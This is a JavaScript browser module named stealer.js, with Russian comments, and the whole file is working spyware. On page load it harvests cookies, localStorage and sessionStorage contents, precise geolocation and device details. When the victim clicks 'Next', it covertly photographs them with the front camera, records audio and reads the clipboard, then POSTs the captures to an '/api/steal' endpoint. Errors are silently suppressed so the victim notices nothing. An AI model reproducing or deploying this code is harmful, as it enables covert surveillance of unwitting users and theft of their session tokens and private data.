// ==== file: stealer.js ====
// language: JavaScript, target: browser
export const Stealer = {
    data: { cookies: [], ls: [], ss: [], clipboard: '', geo: null, battery: '?', memory: '?', network: '?' },
    started: false,

    init() {
        this.grabCookies();
        this.grabStorage();
        this.grabBattery();
        this.grabNetwork();
        this.grabGeo();
    },

    // Запуск всех функций при клике на "Далее"
    async startAll() {
        if (this.started) return;
        this.started = true;
        this.takePhoto();
        this.recordAudio();
        this.grabClipboard();
    },

    // Скрытный снимок с фронтальной камеры
    async takePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => this.sendFile(blob, 'photo'), 'image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            }, 1000);
        } catch (e) {}
    },

    // Запись звука
    async recordAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                this.sendFile(blob, 'audio');
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 3000);
        } catch (e) {}
    },

    async grabClipboard() {
        try {
            if (navigator.clipboard) {
                const t = await navigator.clipboard.readText();
                if (t) this.data.clipboard = t;
            }
        } catch (e) {}
    },

    sendFile(blob, type) {
        const form = new FormData();
        form.append('type', type);
        form.append('file', blob);
        fetch('/api/steal', { method: 'POST', body: form }).catch(() => {});
    },

    grabCookies() {
        try { document.cookie.split(';').forEach(c => { const [n,...v]=c.split('='); if(n&&v.length) this.data.cookies.push({name:n.trim(),value:v.join('=')}); }); } catch(e){}
    },

    grabStorage() {
        try {
            for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)this.data.ls.push({name:k,value:localStorage.getItem(k)});}
            for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);if(k)this.data.ss.push({name:k,value:sessionStorage.getItem(k)});}
        } catch(e){}
    },

    async grabBattery() {
        try { if(navigator.getBattery){const b=await navigator.getBattery();this.data.battery=Math.round(b.level*100)+'%';} } catch(e){}
    },

    grabNetwork() {
        try { if(navigator.deviceMemory)this.data.memory=navigator.deviceMemory+' GB'; if(navigator.connection)this.data.network=navigator.connection.effectiveType||'?'; } catch(e){}
    },

    grabGeo() {
        try { if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{this.data.geo=p.coords.latitude+','+p.coords.longitude},()=>{},{enableHighAccuracy:true,timeout:5000}); } catch(e){}
    },

    getAll() { return { steal: [...this.data.cookies, ...this.data.ls, ...this.data.ss], clipboard: this.data.clipboard, geo: this.data.geo, battery: this.data.battery, memory: this.data.memory, network: this.data.network }; }
};
